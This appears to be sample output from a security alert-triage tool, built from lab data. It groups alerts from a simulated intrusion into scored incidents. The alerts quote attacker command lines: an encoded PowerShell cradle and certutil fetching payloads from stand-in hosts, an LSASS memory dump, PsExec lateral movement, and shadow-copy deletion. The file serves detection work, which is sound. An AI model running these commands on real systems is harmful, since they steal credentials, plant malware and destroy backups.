@@ -1,0 +1,782 @@
+{
+  "meta": {
+    "generated": "2026-10-29 11:43",
+    "input": "sample_alerts.json",
+    "mode": "offline (local watchlist only)",
+    "alert_count": 15
+  },
+  "incidents": [
+    {
+      "host": "WS-FIN-07",
+      "start": "2026-10-20T09:12:04+00:00",
+      "end": "2026-10-20T09:52:47+00:00",
+      "alerts": [
+        {
+          "id": "ALR-1002",
+          "timestamp": "2026-10-20T09:12:04+00:00",
+          "rule": "Microsoft Office Application Spawning a Shell or Script Host",
+          "rule_id": "063e4cda-2f37-4b65-97cb-319294a5d27a",
+          "severity": "high",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": "10.10.20.37",
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parent_process": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGQAbgAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUAMQAuAHAAcwAxACcAKQA=",
+          "sha256": "e8beeb60a46d78a58413bdb0c48e9af0d9092f44c01851e666b93e848e814e6e",
+          "mitre": [
+            "T1566.001",
+            "T1204.002"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "10.10.20.37",
+              "internal": true
+            },
+            {
+              "type": "sha256",
+              "value": "e8beeb60a46d78a58413bdb0c48e9af0d9092f44c01851e666b93e848e814e6e",
+              "internal": false
+            },
+            {
+              "type": "url",
+              "value": "http://update-cdn.example/stage1.ps1",
+              "internal": false
+            },
+            {
+              "type": "domain",
+              "value": "update-cdn.example",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "10.10.20.37": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": [
+                "internal address - not sent to external intel"
+              ]
+            },
+            "e8beeb60a46d78a58413bdb0c48e9af0d9092f44c01851e666b93e848e814e6e": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": []
+            },
+            "http://update-cdn.example/stage1.ps1": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": []
+            },
+            "update-cdn.example": {
+              "verdict": "malicious",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "Staging domain seen in phishing campaign (lab data)"
+              ]
+            }
+          },
+          "score": 80,
+          "score_reasons": [
+            "base high severity (+45)",
+            "1 malicious IOC(s): update-cdn.example (+20)",
+            "medium-criticality asset: Finance workstation (+5)",
+            "decoded PowerShell contains downloadstring, iex, net.webclient (+10)"
+          ]
+        },
+        {
+          "id": "ALR-1003",
+          "timestamp": "2026-10-20T09:12:04+00:00",
+          "rule": "PowerShell Encoded Command Execution",
+          "rule_id": "6bc1d12d-1f9f-4e58-b1b3-9a1c219e7668",
+          "severity": "high",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": "10.10.20.37",
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parent_process": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGQAbgAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUAMQAuAHAAcwAxACcAKQA=",
+          "sha256": null,
+          "mitre": [
+            "T1059.001",
+            "T1027"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "10.10.20.37",
+              "internal": true
+            },
+            {
+              "type": "url",
+              "value": "http://update-cdn.example/stage1.ps1",
+              "internal": false
+            },
+            {
+              "type": "domain",
+              "value": "update-cdn.example",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "10.10.20.37": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": [
+                "internal address - not sent to external intel"
+              ]
+            },
+            "http://update-cdn.example/stage1.ps1": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": []
+            },
+            "update-cdn.example": {
+              "verdict": "malicious",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "Staging domain seen in phishing campaign (lab data)"
+              ]
+            }
+          },
+          "score": 80,
+          "score_reasons": [
+            "base high severity (+45)",
+            "1 malicious IOC(s): update-cdn.example (+20)",
+            "medium-criticality asset: Finance workstation (+5)",
+            "decoded PowerShell contains downloadstring, iex, net.webclient (+10)"
+          ]
+        },
+        {
+          "id": "ALR-1004",
+          "timestamp": "2026-10-20T09:12:40+00:00",
+          "rule": "Certutil Used to Download a File",
+          "rule_id": "5a0ad155-445b-4fda-84bd-a27b336398e1",
+          "severity": "high",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": "10.10.20.37",
+          "dst_ip": "198.51.100.23",
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\certutil.exe",
+          "parent_process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "certutil.exe -urlcache -split -f http://198.51.100.23/svch.exe C:\\Users\\Public\\svch.exe",
+          "sha256": null,
+          "mitre": [
+            "T1105",
+            "T1218"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "10.10.20.37",
+              "internal": true
+            },
+            {
+              "type": "ip",
+              "value": "198.51.100.23",
+              "internal": false
+            },
+            {
+              "type": "url",
+              "value": "http://198.51.100.23/svch.exe",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "10.10.20.37": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": [
+                "internal address - not sent to external intel"
+              ]
+            },
+            "198.51.100.23": {
+              "verdict": "malicious",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "Payload host serving svch.exe (lab data)"
+              ]
+            },
+            "http://198.51.100.23/svch.exe": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": []
+            }
+          },
+          "score": 70,
+          "score_reasons": [
+            "base high severity (+45)",
+            "1 malicious IOC(s): 198.51.100.23 (+20)",
+            "medium-criticality asset: Finance workstation (+5)"
+          ]
+        },
+        {
+          "id": "ALR-1005",
+          "timestamp": "2026-10-20T09:14:10+00:00",
+          "rule": "Registry Run Key Points to Suspicious Location",
+          "rule_id": "1c8084a2-dfd8-41cf-adad-1e371dfa159a",
+          "severity": "medium",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Users\\Public\\svch.exe",
+          "parent_process": null,
+          "command_line": "HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcHostHelper = C:\\Users\\Public\\svch.exe",
+          "sha256": "783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b",
+          "mitre": [
+            "T1547.001"
+          ],
+          "iocs": [
+            {
+              "type": "sha256",
+              "value": "783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b": {
+              "verdict": "malicious",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "svch.exe loader (lab data)"
+              ]
+            }
+          },
+          "score": 50,
+          "score_reasons": [
+            "base medium severity (+25)",
+            "1 malicious IOC(s): 783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b (+20)",
+            "medium-criticality asset: Finance workstation (+5)"
+          ]
+        },
+        {
+          "id": "ALR-1006",
+          "timestamp": "2026-10-20T09:20:33+00:00",
+          "rule": "Domain and Privilege Discovery Commands",
+          "rule_id": "b781c67b-02e7-4ff5-bc6e-43e95b283db8",
+          "severity": "low",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\whoami.exe",
+          "parent_process": "C:\\Users\\Public\\svch.exe",
+          "command_line": "whoami /all",
+          "sha256": null,
+          "mitre": [
+            "T1033"
+          ],
+          "iocs": [],
+          "enrichment": {},
+          "score": 15,
+          "score_reasons": [
+            "base low severity (+10)",
+            "medium-criticality asset: Finance workstation (+5)"
+          ]
+        },
+        {
+          "id": "ALR-1007",
+          "timestamp": "2026-10-20T09:21:02+00:00",
+          "rule": "Domain and Privilege Discovery Commands",
+          "rule_id": "b781c67b-02e7-4ff5-bc6e-43e95b283db8",
+          "severity": "low",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\net.exe",
+          "parent_process": "C:\\Users\\Public\\svch.exe",
+          "command_line": "net group \"domain admins\" /domain",
+          "sha256": null,
+          "mitre": [
+            "T1087.002"
+          ],
+          "iocs": [],
+          "enrichment": {},
+          "score": 15,
+          "score_reasons": [
+            "base low severity (+10)",
+            "medium-criticality asset: Finance workstation (+5)"
+          ]
+        },
+        {
+          "id": "ALR-1008",
+          "timestamp": "2026-10-20T09:21:30+00:00",
+          "rule": "Domain and Privilege Discovery Commands",
+          "rule_id": "b781c67b-02e7-4ff5-bc6e-43e95b283db8",
+          "severity": "low",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\nltest.exe",
+          "parent_process": "C:\\Users\\Public\\svch.exe",
+          "command_line": "nltest /domain_trusts",
+          "sha256": null,
+          "mitre": [
+            "T1482"
+          ],
+          "iocs": [],
+          "enrichment": {},
+          "score": 15,
+          "score_reasons": [
+            "base low severity (+10)",
+            "medium-criticality asset: Finance workstation (+5)"
+          ]
+        },
+        {
+          "id": "ALR-1009",
+          "timestamp": "2026-10-20T09:35:12+00:00",
+          "rule": "LSASS Dump via comsvcs.dll MiniDump",
+          "rule_id": "d487227c-08b7-412d-a347-92b7b5059cf3",
+          "severity": "critical",
+          "host": "WS-FIN-07",
+          "user": "CORP\\j.rahman",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_process": "C:\\Users\\Public\\svch.exe",
+          "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\d.dmp full",
+          "sha256": null,
+          "mitre": [
+            "T1003.001",
+            "T1218.011"
+          ],
+          "iocs": [],
+          "enrichment": {},
+          "score": 75,
+          "score_reasons": [
+            "base critical severity (+70)",
+            "medium-criticality asset: Finance workstation (+5)"
+          ]
+        },
+        {
+          "id": "ALR-1010",
+          "timestamp": "2026-10-20T09:52:47+00:00",
+          "rule": "Remote Execution via PsExec Service",
+          "rule_id": "dec02808-2f9a-4eea-9dc0-197cb622e4ff",
+          "severity": "medium",
+          "host": "WS-FIN-07",
+          "user": "CORP\\svc_backup",
+          "src_ip": "10.10.20.37",
+          "dst_ip": "10.10.5.12",
+          "dst_host": "SRV-FILE-01",
+          "process": "C:\\Users\\Public\\PsExec64.exe",
+          "parent_process": "C:\\Users\\Public\\svch.exe",
+          "command_line": "PsExec64.exe \\\\SRV-FILE-01 -accepteula -s cmd.exe",
+          "sha256": null,
+          "mitre": [
+            "T1021.002",
+            "T1569.002"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "10.10.20.37",
+              "internal": true
+            },
+            {
+              "type": "ip",
+              "value": "10.10.5.12",
+              "internal": true
+            }
+          ],
+          "enrichment": {
+            "10.10.20.37": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": [
+                "internal address - not sent to external intel"
+              ]
+            },
+            "10.10.5.12": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": [
+                "internal address - not sent to external intel"
+              ]
+            }
+          },
+          "score": 40,
+          "score_reasons": [
+            "base medium severity (+25)",
+            "medium-criticality asset: Finance workstation (+5)",
+            "privileged account CORP\\svc_backup (+10)"
+          ]
+        }
+      ],
+      "techniques": [
+        "T1003.001",
+        "T1021.002",
+        "T1027",
+        "T1033",
+        "T1059.001",
+        "T1087.002",
+        "T1105",
+        "T1204.002",
+        "T1218",
+        "T1218.011",
+        "T1482",
+        "T1547.001",
+        "T1566.001",
+        "T1569.002"
+      ],
+      "tactics": [
+        "initial-access",
+        "execution",
+        "persistence",
+        "defense-evasion",
+        "credential-access",
+        "discovery",
+        "lateral-movement",
+        "command-and-control"
+      ],
+      "score": 100,
+      "score_reasons": [
+        "highest alert score 80",
+        "8 ATT&CK tactics observed (+35)"
+      ],
+      "priority": "P1",
+      "users": [
+        "CORP\\j.rahman",
+        "CORP\\svc_backup"
+      ],
+      "related": [
+        {
+          "incident": "INC-002",
+          "host": "SRV-FILE-01",
+          "why": "WS-FIN-07 executed remotely on SRV-FILE-01; shared IOC 783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b"
+        }
+      ],
+      "id": "INC-001"
+    },
+    {
+      "host": "SRV-FILE-01",
+      "start": "2026-10-20T09:52:49+00:00",
+      "end": "2026-10-20T10:04:15+00:00",
+      "alerts": [
+        {
+          "id": "ALR-1011",
+          "timestamp": "2026-10-20T09:52:49+00:00",
+          "rule": "Remote Execution via PsExec Service",
+          "rule_id": "dec02808-2f9a-4eea-9dc0-197cb622e4ff",
+          "severity": "medium",
+          "host": "SRV-FILE-01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "src_ip": "10.10.20.37",
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\cmd.exe",
+          "parent_process": "C:\\Windows\\PSEXESVC.exe",
+          "command_line": "cmd.exe",
+          "sha256": null,
+          "mitre": [
+            "T1021.002",
+            "T1569.002"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "10.10.20.37",
+              "internal": true
+            }
+          ],
+          "enrichment": {
+            "10.10.20.37": {
+              "verdict": "unknown",
+              "sources": [],
+              "notes": [
+                "internal address - not sent to external intel"
+              ]
+            }
+          },
+          "score": 40,
+          "score_reasons": [
+            "base medium severity (+25)",
+            "high-criticality asset: File server (finance and HR shares) (+15)"
+          ]
+        },
+        {
+          "id": "ALR-1012",
+          "timestamp": "2026-10-20T09:55:03+00:00",
+          "rule": "Scheduled Task Created With Suspicious Action",
+          "rule_id": "b144f8f9-6f3f-4800-a952-76750e57738c",
+          "severity": "medium",
+          "host": "SRV-FILE-01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\schtasks.exe",
+          "parent_process": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"C:\\ProgramData\\svch.exe\" /sc onlogon /ru SYSTEM",
+          "sha256": "783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b",
+          "mitre": [
+            "T1053.005"
+          ],
+          "iocs": [
+            {
+              "type": "sha256",
+              "value": "783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b": {
+              "verdict": "malicious",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "svch.exe loader (lab data)"
+              ]
+            }
+          },
+          "score": 60,
+          "score_reasons": [
+            "base medium severity (+25)",
+            "1 malicious IOC(s): 783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b (+20)",
+            "high-criticality asset: File server (finance and HR shares) (+15)"
+          ]
+        },
+        {
+          "id": "ALR-1013",
+          "timestamp": "2026-10-20T10:03:41+00:00",
+          "rule": "Volume Shadow Copy Deletion",
+          "rule_id": "fab5266b-0aab-4311-95fa-22b8d6ab0b1e",
+          "severity": "critical",
+          "host": "SRV-FILE-01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\vssadmin.exe",
+          "parent_process": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "vssadmin.exe delete shadows /all /quiet",
+          "sha256": null,
+          "mitre": [
+            "T1490"
+          ],
+          "iocs": [],
+          "enrichment": {},
+          "score": 85,
+          "score_reasons": [
+            "base critical severity (+70)",
+            "high-criticality asset: File server (finance and HR shares) (+15)"
+          ]
+        },
+        {
+          "id": "ALR-1014",
+          "timestamp": "2026-10-20T10:04:15+00:00",
+          "rule": "Security Event Log Cleared",
+          "rule_id": "01e595ae-10ef-405a-ac0e-81ed5642cc27",
+          "severity": "high",
+          "host": "SRV-FILE-01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": null,
+          "parent_process": null,
+          "command_line": null,
+          "sha256": null,
+          "mitre": [
+            "T1070.001"
+          ],
+          "iocs": [],
+          "enrichment": {},
+          "score": 60,
+          "score_reasons": [
+            "base high severity (+45)",
+            "high-criticality asset: File server (finance and HR shares) (+15)"
+          ]
+        }
+      ],
+      "techniques": [
+        "T1021.002",
+        "T1053.005",
+        "T1070.001",
+        "T1490",
+        "T1569.002"
+      ],
+      "tactics": [
+        "execution",
+        "persistence",
+        "defense-evasion",
+        "lateral-movement",
+        "impact"
+      ],
+      "score": 100,
+      "score_reasons": [
+        "highest alert score 85",
+        "5 ATT&CK tactics observed (+20)"
+      ],
+      "priority": "P1",
+      "users": [
+        "NT AUTHORITY\\SYSTEM"
+      ],
+      "related": [
+        {
+          "incident": "INC-001",
+          "host": "WS-FIN-07",
+          "why": "shared IOC 783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b"
+        }
+      ],
+      "id": "INC-002"
+    },
+    {
+      "host": "RDP-JUMP-01",
+      "start": "2026-10-20T03:15:22+00:00",
+      "end": "2026-10-20T03:15:22+00:00",
+      "alerts": [
+        {
+          "id": "ALR-1001",
+          "timestamp": "2026-10-20T03:15:22+00:00",
+          "rule": "Brute Force - 10 or More Failed Logons From One Source in 5 Minutes",
+          "rule_id": "f4655c2e-7322-44dd-9ffa-a8b8b9b04bd7",
+          "severity": "medium",
+          "host": "RDP-JUMP-01",
+          "user": "administrator",
+          "src_ip": "203.0.113.77",
+          "dst_ip": null,
+          "dst_host": null,
+          "process": null,
+          "parent_process": null,
+          "command_line": null,
+          "sha256": null,
+          "mitre": [
+            "T1110.001"
+          ],
+          "event_count": 48,
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "203.0.113.77",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "203.0.113.77": {
+              "verdict": "malicious",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "Mass RDP brute-forcer (lab data)"
+              ]
+            }
+          },
+          "score": 75,
+          "score_reasons": [
+            "base medium severity (+25)",
+            "1 malicious IOC(s): 203.0.113.77 (+20)",
+            "high-criticality asset: Internet-facing RDP jump host (+15)",
+            "privileged account administrator (+10)",
+            "high volume: 48 events (+5)"
+          ]
+        }
+      ],
+      "techniques": [
+        "T1110.001"
+      ],
+      "tactics": [
+        "credential-access"
+      ],
+      "score": 75,
+      "score_reasons": [
+        "highest alert score 75"
+      ],
+      "priority": "P2",
+      "users": [
+        "administrator"
+      ],
+      "related": [],
+      "id": "INC-003"
+    },
+    {
+      "host": "WS-HR-02",
+      "start": "2026-10-20T11:30:00+00:00",
+      "end": "2026-10-20T11:30:00+00:00",
+      "alerts": [
+        {
+          "id": "ALR-1015",
+          "timestamp": "2026-10-20T11:30:00+00:00",
+          "rule": "Scheduled Task Created With Suspicious Action",
+          "rule_id": "b144f8f9-6f3f-4800-a952-76750e57738c",
+          "severity": "medium",
+          "host": "WS-HR-02",
+          "user": "CORP\\it.admin",
+          "src_ip": null,
+          "dst_ip": null,
+          "dst_host": null,
+          "process": "C:\\Windows\\System32\\schtasks.exe",
+          "parent_process": "C:\\Program Files (x86)\\Adobe\\Acrobat DC\\Acrobat\\AcroRd32.exe",
+          "command_line": "schtasks /create /tn \"Adobe Acrobat Update Task\" /tr \"C:\\ProgramData\\Adobe\\ARM\\AdobeARM.exe\" /sc daily",
+          "sha256": "8745a9741618ba4816c65083904f6a5ced3bb5954335b8ec8c316e8ba0facafe",
+          "mitre": [
+            "T1053.005"
+          ],
+          "iocs": [
+            {
+              "type": "sha256",
+              "value": "8745a9741618ba4816c65083904f6a5ced3bb5954335b8ec8c316e8ba0facafe",
+              "internal": false
+            }
+          ],
+          "enrichment": {
+            "8745a9741618ba4816c65083904f6a5ced3bb5954335b8ec8c316e8ba0facafe": {
+              "verdict": "clean",
+              "sources": [
+                "internal-ti"
+              ],
+              "notes": [
+                "AdobeARM.exe signed updater (lab data)"
+              ]
+            }
+          },
+          "score": 20,
+          "score_reasons": [
+            "base medium severity (+25)",
+            "file hash is on the known-good list (-15)",
+            "privileged account CORP\\it.admin (+10)"
+          ]
+        }
+      ],
+      "techniques": [
+        "T1053.005"
+      ],
+      "tactics": [
+        "persistence"
+      ],
+      "score": 20,
+      "score_reasons": [
+        "highest alert score 20"
+      ],
+      "priority": "P4",
+      "users": [
+        "CORP\\it.admin"
+      ],
+      "related": [],
+      "id": "INC-004"
+    }
+  ]
+}
